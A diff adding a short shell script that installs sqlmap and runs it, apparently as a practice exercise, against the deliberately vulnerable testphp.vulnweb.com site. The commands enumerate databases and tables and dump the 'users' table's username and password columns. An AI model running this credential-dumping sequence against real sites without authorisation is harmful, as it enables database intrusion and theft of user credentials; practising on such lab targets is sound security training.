@@ -1,0 +1,10 @@
+# Target URL: http://testphp.vulnweb.com/artists.php?artist=1
+sudo apt-get update                                  # Update package lists
+sudo apt-get install -y sqlmap                       # Install sqlmap
+sqlmap --help                                        # Show sqlmap help and options
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs           # Enumerate databases
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables            # List tables in database 'acuart'
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns   # List columns in table 'users'
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump      # Dump all data from table 'users'
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump   # Dump 'uname' column from 'users'
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C pass --dump    # Dump 'pass' column from 'users'
